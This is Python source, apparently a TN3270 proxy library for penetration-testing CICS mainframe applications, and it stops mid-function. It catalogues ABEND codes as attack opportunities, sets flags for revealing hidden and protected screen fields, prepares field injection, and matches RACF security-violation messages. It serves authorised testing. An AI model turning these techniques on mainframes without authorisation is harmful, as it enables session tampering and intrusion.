"""
Gr0gu3270 Python Library
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This python library was developed to create an interoperable object
used to test 3270 based applications. This object manages the logging
database, connectivity and tracking state of the connections. There is no user
interface provided by this class, the example UI is included in tk.py
"""
__version__ = '1.2.5-2'
__author__ = 'Garland Glessner'
__license__ = "GPL"
__name__ = "Gr0gu3270"

import logging
import sqlite3
import socket
import time
import ssl
import re
import select
import csv
import datetime
import json

from pathlib import Path

# CICS ABEND codes and their descriptions
ABEND_CODES = {
    'ASRA': 'Program check (possible injection vulnerability)',
    'ASRB': 'Operating system abend',
    'AICA': 'Runaway task (infinite loop)',
    'AEY7': 'Not authorized (security violation - escalation target)',
    'AEY9': 'CICS unable to process',
    'AEYD': 'Transaction not found',
    'AEYF': 'Resource security check failure',
    'APCT': 'Program not found (enumeration opportunity)',
    'AFCA': 'DATASET not found',
    'AFCR': 'DATASET read error',
    'AKCS': 'Temporary storage queue not found',
    'AKCT': 'Transient data queue not found',
    'ASP1': 'Supervisor call',
    'ATNI': 'Task abend due to node error',
    'AEXL': 'EXEC interface program not found',
    'ABMB': 'BMS map not found',
    'ADTC': 'DL/I call error',
    'AEIP': 'EXEC CICS command error',
    'AEZD': 'CICS security violation',
    'AQRD': 'Queue read error',
    'AEI0': 'EXEC CICS interface error (injection vector)',
    'AEI9': 'Invalid data format (type confusion)',
    'AKCP': 'Temp storage full (DoS via queue flooding)',
    'AFCF': 'File not open (race condition)',
    'AFCB': 'Dataset busy (contention/DoS)',
    'ASP2': 'Supervisor service error (kernel-level)',
    'ATCV': 'Task control violation (privilege escalation)',
    'AEXK': 'EXEC interface security check failure',
    'AIIB': 'Invalid interval control (timer manipulation)',
    'AWDQ': 'Deadlock wait (DoS)',
    'AKEA': 'GETMAIN failure (memory exhaustion)',
    'AEC3': 'Socket error (network-level)',
    'AEDF': 'Program isolation violation',
}

# ABEND severity mapping for Findings
FINDING_CLASSES = {
    'ABEND': {
        'description': 'An application ABEND (abnormal end) was triggered during interaction. '
                       'ABENDs reveal internal program failures — buffer overflows (ASRA/ASRB), '
                       'program-not-found (APCT), or resource deadlocks (AICA). They expose '
                       'error handling weaknesses and can leak program names, memory layouts, '
                       'and internal transaction flow.',
        'remediation': 'Implement proper HANDLE ABEND in CICS programs. Review the failing '
                       'program for unchecked input lengths (MOVE into PIC X fields), missing '
                       'RESP checks on CICS commands, and arithmetic overflows on COMP fields. '
                       'Ensure ABEND messages do not disclose sensitive internal details.',
    },
    'SCREEN_MAP': {
        'description': 'A hidden field (non-display attribute) was detected on the screen. '
                       'Hidden fields often carry session tokens, authorization flags, user '
                       'roles, or pricing data that the application assumes cannot be modified. '
                       'A TN3270 proxy allows reading and tampering with these values.',
        'remediation': 'Never rely on hidden fields for security-critical data. Validate all '
                       'input server-side. Move sensitive state to COMMAREA, CICS containers, '
                       'or TS queues rather than screen fields.',
    },
    'AID_SCAN': {
        'description': 'An AID key (PF/PA/ENTER) produced an unexpected result on the current '
                       'screen — either a security violation, an unmapped navigation path, or '
                       'an application error. This reveals undocumented functions, debug screens, '
                       'or access control gaps in the transaction.',
        'remediation': 'Restrict AID key handling to documented keys only. Use HANDLE AID in '
                       'CICS programs to explicitly process or reject each key. Disable debug '
                       'and admin functions in production regions.',
    },
    'SPOOL': {
        'description': 'The JES SPOOL interface is accessible from this CICS region. SPOOL '
                       'access allows reading print output from other users and, if INTRDR '
                       '(internal reader) is open, submitting JCL for execution — effectively '
                       'achieving remote code execution on the mainframe.',
        'remediation': 'Restrict SPOOL and INTRDR access via ESM rules (RACF FACILITY class). '
                       'Disable SPOOLOPEN/SPOOLWRITE commands in production CICS regions. '
                       'Audit CICS SIT parameters related to spool access.',
    },
    'FUZZER': {
        'description': 'Field fuzzing produced an unexpected application response — a new '
                       'screen, an ABEND, a security violation, or a navigated state change. '
                       'This indicates the application does not properly validate input for '
                       'this field, which may be exploitable.',
        'remediation': 'Add server-side input validation for field length, type, and range. '
                       'Use PIC clauses and CICS BMS validation to enforce constraints. '
                       'Test with boundary values and unexpected character sets.',
    },
    'SECURITY_AUDIT': {
        'description': 'A security violation was detected by the External Security Manager '
                       '(RACF, ACF2, or Top Secret). This indicates the current user lacks '
                       'authorization for the requested resource or transaction. The violation '
                       'pattern reveals which ESM is in use and how access control is configured.',
        'remediation': 'Review ESM rules for the affected resource. Ensure least-privilege '
                       'access is enforced. Audit CICS resource definitions (TCT, PCT, PPT) '
                       'for overly permissive settings.',
    },
}

ABEND_SEVERITY = {
    'ASRA': 'CRIT', 'ASRB': 'CRIT', 'AICA': 'HIGH',
    'AEY7': 'HIGH', 'AEYF': 'HIGH', 'AEZD': 'HIGH',
    'AEYD': 'INFO', 'APCT': 'INFO',
    # Extended codes
    'AEI0': 'HIGH', 'AEI9': 'MEDIUM', 'AKCP': 'HIGH',
    'AFCF': 'MEDIUM', 'AFCB': 'MEDIUM', 'ASP2': 'CRIT',
    'ATCV': 'CRIT', 'AEXK': 'HIGH', 'AIIB': 'MEDIUM',
    'AWDQ': 'HIGH', 'AKEA': 'HIGH', 'AEC3': 'MEDIUM', 'AEDF': 'HIGH',
    # Existing codes previously unmapped
    'AEY9': 'MEDIUM', 'AFCA': 'MEDIUM', 'AFCR': 'MEDIUM',
    'AKCS': 'INFO', 'AKCT': 'INFO', 'ASP1': 'HIGH',
    'ATNI': 'MEDIUM', 'AEXL': 'MEDIUM', 'ABMB': 'INFO',
    'ADTC': 'MEDIUM', 'AEIP': 'MEDIUM', 'AQRD': 'MEDIUM',
}
# Default for unlisted codes: MEDIUM

# CICS error message prefixes (DFHxxxx)
CICS_ERROR_PREFIXES = [
    'DFH', 'DFHAC', 'DFHAM', 'DFHAP', 'DFHBM', 'DFHDB', 'DFHDC',
    'DFHDU', 'DFHEC', 'DFHED', 'DFHFC', 'DFHIC', 'DFHJC', 'DFHKE',
    'DFHME', 'DFHMQ', 'DFHPG', 'DFHPI', 'DFHRM', 'DFHRT', 'DFHSM',
    'DFHSO', 'DFHSR', 'DFHTD', 'DFHTS', 'DFHWB', 'DFHXS', 'DFHZC',
]

# Security violation patterns for RACF/ACF2/Top Secret audit
SECURITY_VIOLATION_PATTERNS = [
    'NOT AUTHORIZED',
    'NOT AUTH',
    'SECURITY VIOLATION',
    'ACCESS DENIED',
    'RACF',
    'ICH408I',
    'ICH409I',
    'ICH70001I',
    'IRR012I',
    'IRR013I',
    'ACF2',
    'TOP SECRET',
    'TSS7000I',
    'TSS7001I',
    'INVALID USERID',
    'INVALID PASSWORD',
    'PASSWORD EXPIRED',
    'USERID REVOKED',
    'DFHAC2002',
    'DFHAC2008',
    'DFHAC2032',
    'DFHAC2034',
    'TRANSACTION NOT AUTHORIZED',
    'RESOURCE NOT AUTHORIZED',
]


# SPOOLOPEN response indicators
SPOOL_SUCCESS_PATTERNS = ['NORMAL', 'RESPONSE: NORMAL']
SPOOL_FAIL_PATTERNS = ['INVREQ', 'NOTAUTH', 'DISABLED', 'NOT AUTHORIZED',
                       'INVALID', 'DFHAC']

# EBCDIC to ASCII table
e2a = [
  '[0x00]', '[0x01]', '[0x02]', '[0x03]', '[0x04]', '[0x05]', '[0x06]', '[0x07]', '[0x08]', '[0x09]', '[0x0A]', '[0x0B]', '[0x0C]', '[0x0D]', '[0x0E]', '[0x0F]',
  '[0x10]', '[0x11]', '[0x12]', '[0x13]', '[0x14]', '[0x15]', '[0x16]', '[0x17]', '[0x18]', '[0x19]', '[0x1A]', '[0x1B]', '[0x1C]', '[0x1D]', '[0x1E]', '[0x1F]',
  '[0x20]', '[0x21]', '[0x22]', '[0x23]', '[0x24]', '[0x25]', '[0x26]', '[0x27]', '[0x28]', '[0x29]', '[0x2A]', '[0x2B]', '[0x2C]', '[0x2D]', '[0x2E]', '[0x2F]',
  '[0x30]', '[0x31]', '[0x32]', '[0x33]', '[0x34]', '[0x35]', '[0x36]', '[0x37]', '[0x38]', '[0x39]', '[0x3A]', '[0x3B]', '[0x3C]', '[0x3D]', '[0x3E]', '[0x3F]',
  ' ', '[0x41]', '[0x42]', '[0x43]', '[0x44]', '[0x45]', '[0x46]', '[0x47]', '[0x48]', '[0x49]', '¢', '.', '<', '(', '+', '|',
  '&', '[0x51]', '[0x52]', '[0x53]', '[0x54]', '[0x55]', '[0x56]', '[0x57]', '[0x58]', '[0x59]', '!', '$', '*', ')', ';', '≠',
  '-', '/', '[0x62]', '[0x63]', '[0x64]', '[0x65]', '[0x66]', '[0x67]', '[0x68]', '[0x69]', '|', ',', '%', '_', '>', '?',
  '[0x70]', '[0x71]', '[0x72]', '[0x73]', '[074]', '[0x75]', '[0x76]', '[0x77]', '[0x78]', '`', ':', '#', '@', '\'', '=', '"',
  '[0x80]', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', '[0x8A]', '[0x8B]', '[0x8C]', '[0x8D]', '[0x8E]', '[0x8F]',
  '[0x90]', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', '[0x9A]', '[0x9B]', '[0x9C]', '[0x9D]', '[0x9E]', '[0x9F]',
  '[0xA0]', '~', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '[0xAA]', '[0xAB]', '[0xAC]', '[0xAD]', '[0xAE]', '[0xAF]',
  '[0xB0]', '[0xB1]', '[0xB2]', '[0xB3]', '[0xB4]', '[0xB5]', '[0xB6]', '[0xB7]', '[0xB8]', '[0xB9]', '[0xBA]', '[0xBB]', '[0xBC]', '[0xBD]', '[0xBE]', '[0xBF]',
  '{', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', '[0xCA]', '[0xCB]', '[0xCC]', '[0xCD]', '[0xCE]', '[0xCF]',
  '}', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', '[0xDA]', '[0xDB]', '[0xDC]', '[0xDD]', '[0xDE]', '[0xDF]',
  '\\', '[0xE1]', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[0xEA]', '[0xEB]', '[0xEC]', '[0xED]', '[0xEE]', '[0xEF]',
  '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '[0xFA]', '[0xFB]', '[0xFC]', '[0xFD]', '[0xFE]', '[0xFF]' ]



BUFFER_MAX = 10000

class Gr0gu3270:

    AIDS = {
        'NO': b'\x60',
        'QREPLY': b'\x61',
        'ENTER': b'\x7d',
        'PF1': b'\xf1',
        'PF2': b'\xf2',
        'PF3': b'\xf3',
        'PF4': b'\xf4',
        'PF5': b'\xf5',
        'PF6': b'\xf6',
        'PF7': b'\xf7',
        'PF8': b'\xf8',
        'PF9': b'\xf9',
        'PF10': b'\x7a',
        'PF11': b'\x7b',
        'PF12': b'\x7c',
        'PF13': b'\xc1',
        'PF14': b'\xc2',
        'PF15': b'\xc3',
        'PF16': b'\xc4',
        'PF17': b'\xc5',
        'PF18': b'\xc6',
        'PF19': b'\xc7',
        'PF20': b'\xc8',
        'PF21': b'\xc9',
        'PF22': b'\x4a',
        'PF23': b'\x4b',
        'PF24': b'\x4c',
        'OICR': b'\xe6',
        'MSR_MHS': b'\xe7',
        'SELECT': b'\x7e',
        'PA1': b'\x6c',
        'PA2': b'\x6e',
        'PA3': b'\x6b',
        'CLEAR': b'\x6d',
        'SYSREQ': b'\xf0'
    }

    def __init__(self,
                 server_ip, 
                 server_port, 
                 proxy_port, 
                 proxy_ip="127.0.0.1", 
                 offline_mode = False,
                 project_name = "pentest", 
                 loglevel=logging.WARNING,
                 tls_enabled = False,
                 logfile=None):
        

        # Passed Variable for Init
        self.project_name = project_name
        self.server_ip  = server_ip
        self.server_port = int(server_port)
        self.proxy_ip = proxy_ip
        self.proxy_port = proxy_port
        self.tls_enabled = tls_enabled
        self.offline_mode = offline_mode
        self.offline = offline_mode

        # Internal Vars
        self.connected = False
        self.client = None
        self.server = None
        self.inject_mask = None
        self.inject_setup_capture = False
        self.inject_config_set = False 
        self.inject_preamble = 0
        self.inject_postamble = 0
        self.inject_mask_len = 0

        self.db_filename = self.project_name + ".db"
        self.found_aids = [] # for keeping track of AIDs found on screen

        # ABEND Detection (PR1)
        self.abend_detection = True  # always on — no toggle
        self.abend_history = []
        self.abend_count = 0

        # Screen Map (PR2)
        self.current_screen_map = []

        # Transaction Correlation (PR3)
        self.transaction_tracking = True  # always on — no toggle
        self.pending_transaction = None
        self.transaction_history = []

        self.last_server_data = None

        # AID Scan (PR5)
        self.aid_scan_running = False
        self.aid_scan_results = []
        self.aid_scan_keys = []
        self.aid_scan_index = 0
        self.aid_scan_replay_path = []
        self.aid_scan_ref_screen = None
        self.aid_scan_timeout = 1.0
        self.aid_scan_txn_code = None

        # State Tracking Vars
        self.hack_toggled = False
        self.hack_on = False        # We in the butter zone now
        self.hack_prot = False      # 'Protected' Flag (Bit 6)
        self.hack_hf = False        # 'Non-display' Flag (Bit 4)
        self.hack_rnr = False       # 'Numeric Only' Flag (Bit 5)
        self.hack_ei = False        # enable intentisty
        self.hack_sf = False        # Start Field
        self.hack_sfe = False       # Start Field Extended
        self.hack_mf = False        # Modified Field
        self.hack_hv = False        # High Visibility
        # Hack Color is always on — reveal black-on-black fields as yellow
        self.hack_color_sfe = True
        self.hack_color_mf = True
        self.hack_color_sa = True
        self.hack_color_hv = True

        # Create the Loggers (file and stderr)
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)
        if logfile is not None:
            logger_formatter = logging.Formatter(
                '%(levelname)s :: {} :: %(funcName)s'
                ' :: %(message)s'.format(self.filename))
        else:
            logger_formatter = logging.Formatter(
                '%(module)s :: %(levelname)s :: %(funcName)s :: %(lineno)d :: %(message)s')
        # Log to stderr
        ch = logging.StreamHandler()
        ch.setFormatter(logger_formatter)
        ch.setLevel(loglevel)
        if not self.logger.hasHandlers():
            self.logger.addHandler(ch)
        
        self.logger.debug("Gr0gu3270 Initializing")
        # Initialize the database 
        self.db_init()

        self.logger.debug("Project Name: {}".format(self.project_name))
        self.logger.debug("Server: {}:{}".format(
                                            self.server_ip, self.server_port))
        self.logger.debug("Proxy: {}:{}".format(self.proxy_ip,self.proxy_port))
        self.current_state_debug_msg()

    def on_closing(self):
        self.logger.debug("Shutting Down database")
        self.sql_con.commit()
        self.sql_con.close()
        self.logger.debug("Shutting Down client connection")
        if self.client:
            self.client.close()
        self.logger.debug("Shutting Down server connection")
        if self.server:
            self.server.close()

    def db_init(self):
        '''
        Either creates, or loads, a SQLite 3 database file based on the project 
        name.
        
        Args: 
            None
        Returns: 
            None but sql_con and sql_cur get populated as SQL objects

        TODO:
            Add support for other database types
        '''
        # SQLite3---

        # If DB file doesn't exist and Server IP address isn't set, exit---
        if not Path(self.db_filename).is_file() and not self.server_ip:
            raise Exception("Attempt to intialize without a server IP or port")

        self.logger.debug("Opening database file: {}".format(self.db_filename))

        self.sql_con = sqlite3.connect(self.db_filename, check_same_thread=False)
        self.sql_con.set_trace_callback(self.logger.debug) # Use log for SQL debugging
        self.sql_cur = self.sql_con.cursor()

        self.sql_cur.execute("""
                             SELECT count(name) 
                             FROM sqlite_master 
                             WHERE TYPE='table' 
                                AND NAME='Config'
                             """)

        # If table exists, load previous settings---
        if self.sql_cur.fetchone()[0] == 1:
            self.logger.debug("Found existing project config")
            self.sql_cur.execute("SELECT * FROM Config")
            record = self.sql_cur.fetchall()
            for row in record:
                self.logger.debug(row)

                if self.server_ip != row[1] and self.offline_mode == 0:
                    raise Exception("Error! IP setting doesn't match server " 
                                    "IP address in existing project file! "
                                    "Server IP: {} != Project IP: {}".format(
                                            self.server_ip, row[1]
                                    ))
                self.server_ip = row[1]

                self.logger.debug('{} {}'.format(type(self.server_port),type(row[2])))
                if self.server_port != int(row[2])  and self.offline_mode == 0:
                    raise Exception("Error! -p setting doesn't match server " 
                                   "TCP port address in existing project file! "
                                    "Server port: {} != Project IP: {}".format(
                                            self.server_port, row[2]
                                    ))
                if self.proxy_port != int(row[3]):
                    self.logger.info("Proxy port from project ({}) "
                                  "differs from CLI argument ({}), "
                                  "using CLI value".format(
                                            row[3], self.proxy_port
                                     ))

                self.server_port = int(row[2])
                # Keep CLI proxy_port — don't override with DB value
                self.tls_enabled = int(row[4])
        # else create table with current configuration---
        else:
            self.logger.debug("Creating Config table...")
            self.sql_cur.execute("""
                    CREATE TABLE Config (
                                 CREATION_TS TEXT NOT NULL, 
                                 SERVER_IP TEXT NOT NULL, 
                                 SERVER_PORT INT NOT NULL, 
                                 PROXY_PORT INT NOT NULL, 
                                 TLS_ENABLED INT NOT NULL
                                 )
                    """)
            
            insert = """
                      INSERT INTO Config (
                      'CREATION_TS', 
                      'SERVER_IP', 
                      'SERVER_PORT', 
                      'PROXY_PORT', 
                      'TLS_ENABLED'
                      ) VALUES (
                      '{time}',
                      '{server_ip}',
                      '{server_port}',
                      '{proxy_port}',
                      '{tls}' 
                      )""".format(
                        time= str(time.time()),
                        server_ip = self.server_ip,
                        server_port = str(self.server_port),
                        proxy_port = str(self.proxy_port),
                        tls = self.tls_enabled * 1 # Why times one? To convert it to an int
                      )
            
            self.sql_cur.execute(insert)
            self.sql_con.commit()

        self.sql_cur.execute("""
                             SELECT count(name) 
                             FROM sqlite_master 
                             WHERE TYPE='table' AND NAME='Logs'
                             """)
        if self.sql_cur.fetchone()[0] != 1:
            self.logger.debug("Creating Logs table...")
            self.sql_cur.execute("""
                            CREATE TABLE Logs (
                            ID INTEGER PRIMARY KEY AUTOINCREMENT, 
                            TIMESTAMP TEXT, 
                            C_S CHAR(1), 
                            NOTES TEXT, 
                            DATA_LEN INT, 
                            RAW_DATA BLOB(4000))
                            """) # 3,564
            self.sql_con.commit()

        # ABEND Detection table (PR1)
        self.sql_cur.execute("""
                             SELECT count(name)
                             FROM sqlite_master
                             WHERE TYPE='table' AND NAME='Abends'
                             """)
        if self.sql_cur.fetchone()[0] != 1:
            self.logger.debug("Creating Abends table...")
            self.sql_cur.execute("""
                            CREATE TABLE Abends (
                            ID INTEGER PRIMARY KEY AUTOINCREMENT,
                            TIMESTAMP TEXT,
                            TYPE TEXT,
                            CODE TEXT,
                            DESCRIPTION TEXT,
                            LOG_ID INTEGER,
                            FOREIGN KEY (LOG_ID) REFERENCES Logs(ID))
                            """)
            self.sql_con.commit()

        # Transaction Correlation table (PR3)
        self.sql_cur.execute("""
                             SELECT count(name)
                             FROM sqlite_master
                             WHERE TYPE='table' AND NAME='Transactions'
                             """)
        if self.sql_cur.fetchone()[0] != 1:
            self.logger.debug("Creating Transactions table...")
            self.sql_cur.execute("""
                            CREATE TABLE Transactions (
                            ID INTEGER PRIMARY KEY AUTOINCREMENT,
                            TIMESTAMP_SENT TEXT,
                            TIMESTAMP_RECV TEXT,
                            TXN_CODE TEXT,
                            DURATION_MS REAL,
                            RESPONSE_LEN INTEGER,
                            STATUS TEXT)
                            """)
            self.sql_con.commit()

        # AID Scan table (PR5)
        self.sql_cur.execute("""
                             SELECT count(name)
                             FROM sqlite_master
                             WHERE TYPE='table' AND NAME='AidScan'
                             """)
        if self.sql_cur.fetchone()[0] != 1:
            self.logger.debug("Creating AidScan table...")
            self.sql_cur.execute("""
                            CREATE TABLE AidScan (
                            ID INTEGER PRIMARY KEY AUTOINCREMENT,
                            TIMESTAMP TEXT,
                            AID_KEY TEXT,
                            CATEGORY TEXT,
                            STATUS TEXT,
                            SIMILARITY REAL,
                            RESPONSE_PREVIEW TEXT,
                            RESPONSE_LEN INTEGER,
                            REPLAY_OK INTEGER DEFAULT 1)
                            """)
            self.sql_con.commit()
        else:
            # Migrate: add REPLAY_OK if missing (pre-v1.2.5 DBs)
            cols = [r[1] for r in self.sql_cur.execute("PRAGMA table_info(AidScan)").fetchall()]
            if 'REPLAY_OK' not in cols:
                self.sql_cur.execute("ALTER TABLE AidScan ADD COLUMN REPLAY_OK INTEGER DEFAULT 1")
                self.sql_con.commit()

        # Findings table
        self.sql_cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='Findings'")
        if not self.sql_cur.fetchone():
            self.logger.debug("Creating Findings table...")
            self.sql_cur.execute("""
                            CREATE TABLE Findings (
                            ID INTEGER PRIMARY KEY AUTOINCREMENT,
                            TIMESTAMP TEXT,
                            SEVERITY TEXT,
                            SOURCE TEXT,
                            TXN_CODE TEXT,
                            MESSAGE TEXT,
                            DEDUP_KEY TEXT UNIQUE,
                            STATUS TEXT DEFAULT 'NEW',
                            REMEDIATION TEXT,
                            CONSTAT TEXT)
                            """)
            self.sql_con.commit()
        else:
            # Migrate: add STATUS and REMEDIATION if missing
            cols = [r[1] for r in self.sql_cur.execute("PRAGMA table_info(Findings)").fetchall()]
            if 'STATUS' not in cols:
                self.sql_cur.execute("ALTER TABLE Findings ADD COLUMN STATUS TEXT DEFAULT 'NEW'")
                self.sql_con.commit()
            if 'REMEDIATION' not in cols:
                self.sql_cur.execute("ALTER TABLE Findings ADD COLUMN REMEDIATION TEXT")
                self.sql_con.commit()
            if 'CONSTAT' not in cols:
                self.sql_cur.execute("ALTER TABLE Findings ADD COLUMN CONSTAT TEXT")
                self.sql_con.commit()

    def write_database_log(self, direction, notes, data):

        if data[0] == 255:
            notes = notes + "tn3270 negotiation"

        self.sql_cur.execute("INSERT INTO Logs ('TIMESTAMP', 'C_S', 'NOTES', 'DATA_LEN', 'RAW_DATA') VALUES (?, ?, ?, ?, ?)", (str(time.time()), direction, notes, str(len(data)), sqlite3.Binary(data)))

#        self.sql_cur.execute("""
#                             INSERT INTO Logs (
#                                'TIMESTAMP', 
#                                'C_S', 
#                                'NOTES', 
#                                'DATA_LEN', 
#                                'RAW_DATA') 
#                             VALUES (
#                                '{ts}', '{dir}', '{note}', '{len}', {bytes})""".format(
#                                ts=str(time.time()), 
#                                dir=direction, 
#                                note=notes, 
#                                len=str(len(data)), 
#                                bytes=sqlite3.Binary(data)))
        self.sql_con.commit()
        
        return
    
    def all_logs(self,start=0):
        '''
        Gets all logs from the database

            Args:
                start (int): the start record, default 0
        '''
        self.logger.debug("Start: {}".format(start))
        if start > 0 :
            self.logger.debug("Getting all records starting at {}".format(start))
            self.sql_cur.execute("SELECT * FROM Logs WHERE ID > ?", (start,))
        else:
            self.logger.debug("Getting all records from database")
            self.sql_cur.execute("SELECT * FROM Logs")

        return self.sql_cur.fetchall()
    
    def get_log(self, record_id):
        self.logger.debug("Fetching record id: {}".format(record_id))
        sql_text = "SELECT * FROM Logs WHERE ID=" + str(record_id)
        self.sql_cur.execute(sql_text)
        return self.sql_cur.fetchall()

    def check_inject_3270e(self):
        '''
        Checks the first record from the logs database and inspects it to
        identify if this server is in tn3270 extended mode or not

            Returns:
                True if the connection is in TN3270E mode
                False if not in TN3270E mode
        '''

        sql_text = "SELECT * FROM Logs WHERE ID=1"
        self.sql_cur.execute(sql_text)
        records = self.sql_cur.fetchall()
        for row in records:
            # If the third character is 
            if row[5][2] == 40:
                self.logger.debug("TN3270E Detected.")
                return True 
            else:
                self.logger.debug("TN3270 Detected.")
                return False

    def export_csv(self,csv_filename=False):
        '''
        Writes the SQL logs to a CSV file

            Args:
                csv_filename (string): the path/filename where to write the csv
                                       file (optional)
            Returns:
                The filename of the csv file
        '''
        if not csv_filename:
            csv_filename = self.project_name + ".csv"

        self.logger.debug("Exporting databse to: {}".format(csv_filename))
        with sqlite3.connect(self.db_filename) as db:
            cursor = db.cursor()
            rows = cursor.execute("SELECT * FROM Logs")
            with open(csv_filename, "w", newline="") as csvfile:
                writer = csv.writer(csvfile)
                for row in rows:
                    ebcdic_data = self.get_ascii(row[5])
                    if re.search("^tn3270 ", row[3]):
                        parsed_3270 = self.parse_telnet(ebcdic_data)
                    else:
                        parsed_3270 = self.parse_3270(ebcdic_data)
                    data = parsed_3270.replace('\n', '')
                    timestamp = float(row[1])
                    dt = datetime.datetime.fromtimestamp(timestamp)
                    if row[2] == "C":
                        direction = "Client"
                    else:
                        direction = "Server"
                    writer.writerow([dt, direction, row[3], row[4], data.encode('utf-8')])
            self.logger.debug('Export finished, filename is: {}'.format(csv_filename))
        return csv_filename

    def current_state_debug_msg(self):

        template = "Hack {} Flag ({}): {}"
        self.logger.debug("Current Flag Settings")
        self.logger.debug("Hack Fields Enabled (hack_on): {}".format(self.hack_on))
        self.logger.debug(template.format("Protected","hack_prot", self.hack_prot))
        self.logger.debug(template.format("Hidden","hack_hf", self.hack_hf))
        self.logger.debug(template.format("Numeric","hack_rnr",self.hack_rnr))
        self.logger.debug(template.format("Intensity","hack_ei", self.hack_ei))
        self.logger.debug(template.format("Start Field","hack_sf", self.hack_sf))
        self.logger.debug(template.format("Start Field Extended","hack_sfe", self.hack_sfe))
        self.logger.debug(template.format("Modify","hack_mf", self.hack_mf))
        self.logger.debug(template.format("High Visibility","hack_hv", self.hack_hv))
        self.logger.debug(template.format("Color Start Field Extended","hack_color_sfe", self.hack_color_sfe))
        self.logger.debug(template.format("Color Modify","hack_color_mf", self.hack_color_mf))
        self.logger.debug(template.format("Color Set Address","hack_color_sa", self.hack_color_sa))
        self.logger.debug(template.format("Color High Visibility","hack_color_hv", self.hack_color_hv))

    def get_ip_port(self):
        '''
        returns a tuple of the server and port
        '''
        return (self.server_ip, self.server_port)
    
    def get_tls(self):
        '''
        Returns whether or not the connection is using TLS
        '''
        return self.tls_enabled

    def get_inject_postamble(self):
        '''
        Returns the inject postamble
        '''
        return self.inject_postamble

    def get_inject_preamble(self):
        '''
        Returns the inject preamble
        '''
        return self.inject_preamble

    def get_inject_mask_len(self):
        '''
        Returns the current inject mask length
        '''
        return self.inject_mask_len
    
    def get_inject_config_set(self):
        '''
        Returns the current inject config (true/false)
        '''
        return self.inject_config_set
    
    def is_offline(self):
        ''' Returns True if offline, False if not'''
        return self.offline

    def set_inject_setup_capture(self,value=1):
        '''
        Sets the inject_setup_capture state
        '''
        self.logger.debug("Changing inject_setup_capture from {} to {}".format(
            self.inject_setup_capture, value))
        self.inject_setup_capture = value

    def set_inject_config_set(self,value=1):
        '''
        Sets the inject_config_set state
        '''
        self.logger.debug("Changing inject_config_set from {} to {}".format(
            self.inject_config_set, value))
        self.inject_config_set = value

    def set_hack_toggled(self,value=1):
        '''
        Sets the hack_toggled state
        '''
        self.logger.debug("Changing hack_toggled from {} to {}".format(
            self.hack_toggled, value))
        self.hack_toggled = value

    def set_hack_on(self,value=1):
        '''
        Sets the hack_on state
        '''
        self.logger.debug("Changing hack_on from {} to {}".format(
            self.hack_on, value))
        self.hack_on = value

    def set_hack_prot(self,value=1):
        '''
        Sets the hack_prot state
        '''
        self.logger.debug("Changing hack_prot from {} to {}".format(
            self.hack_prot, value))
        self.hack_prot = value

    def set_hack_hf(self,value=1):
        '''
        Sets the hack_hf state
        '''
        self.logger.debug("Changing hack_hf from {} to {}".format(
            self.hack_hf, value))
        self.hack_hf = value

    def set_hack_rnr(self,value=1):
        '''
        Sets the hack_rnr state
        '''
        self.logger.debug("Changing hack_rnr from {} to {}".format(
            self.hack_rnr, value))
        self.hack_rnr = value

    def set_hack_ei(self,value=1):
        '''
        Sets the hack_ei state
        '''
        self.logger.debug("Changing hack_ei from {} to {}".format(
            self.hack_ei, value))
        self.hack_ei = value

    def set_hack_sf(self,value=1):
        '''
        Sets the hack_sf state
        '''
        self.logger.debug("Changing hack_sf from {} to {}".format(
            self.hack_sf, value))
        self.hack_sf = value

    def set_hack_sfe(self,value=1):
        '''
        Sets the hack_sfe state
        '''
        self.logger.debug("Changing from {} to {}".format(
            self.hack_sfe, value))
        self.hack_sfe = value

    def set_hack_mf(self,value=1):
        '''
        Sets the hack_mf state
        '''
        self.logger.debug("Changing hack_mf from {} to {}".format(
            self.hack_mf, value))
        self.hack_mf = value

    def set_hack_hv(self,value=1):
        '''
        Sets the hack_prot state
        '''
        self.logger.debug("Changing from {} to {}".format(
            self.hack_hv, value))
        self.hack_hv = value

    def set_inject_mask(self,mask="*"):
        '''Sets the mask to be used for injection'''
        self.logger.debug("Setting mask to '{}'".format(mask))
        self.inject_mask = mask

    # ---- PR1: ABEND Detection Methods ----

    def get_abend_count(self):
        return self.abend_count

    def detect_abend(self, server_data):
        '''
        Scans server data for ABEND codes and CICS error messages.
        Returns list of detected abends (may be empty).
        '''
        detections = []
        ascii_text = self.get_ascii(server_data)

        # Check for ABEND codes
        for code, description in ABEND_CODES.items():
            if code in ascii_text:
                detections.append({
                    'type': 'ABEND',
                    'code': code,
                    'description': description
                })

        # Fallback: regex for ABEND codes not in static dict
        for m in re.finditer(r'(?:Abend Code |ABEND )\(?([A-Z0-9]{4})\)?', ascii_text):
            code = m.group(1)
            if code not in [d['code'] for d in detections]:
                detections.append({
                    'type': 'ABEND',
                    'code': code,
                    'description': 'Unknown ABEND (not in catalog)',
                })

        # Check for DFHxxxx error messages
        for prefix in CICS_ERROR_PREFIXES:
            pattern = prefix + r'[0-9]{4}'
            matches = re.findall(pattern, ascii_text)
            for match in matches:
                detections.append({
                    'type': 'CICS_ERROR',
                    'code': match,
                    'description': 'CICS error message'
                })

        return detections

    def write_abend_log(self, abend, log_id=None):
        '''Writes an abend detection to the database'''
        self.sql_cur.execute(
            "INSERT INTO Abends ('TIMESTAMP', 'TYPE', 'CODE', 'DESCRIPTION', 'LOG_ID') VALUES (?, ?, ?, ?, ?)",
            (str(time.time()), abend['type'], abend['code'], abend['description'], log_id)
        )
        self.sql_con.commit()
        self.abend_count += 1
        self.abend_history.append(abend)

    def all_abends(self, start=0):
        '''Gets all abend records from database'''
        if start > 0:
            self.sql_cur.execute("SELECT * FROM Abends WHERE ID > ?", (start,))
        else:
            self.sql_cur.execute("SELECT * FROM Abends")
        return self.sql_cur.fetchall()

    # ---- Findings ----

    def emit_finding(self, severity, source, message, txn_code=None, dedup_key=None, constat=None):
        '''Emit a security finding with deduplication.'''
        if dedup_key is None:
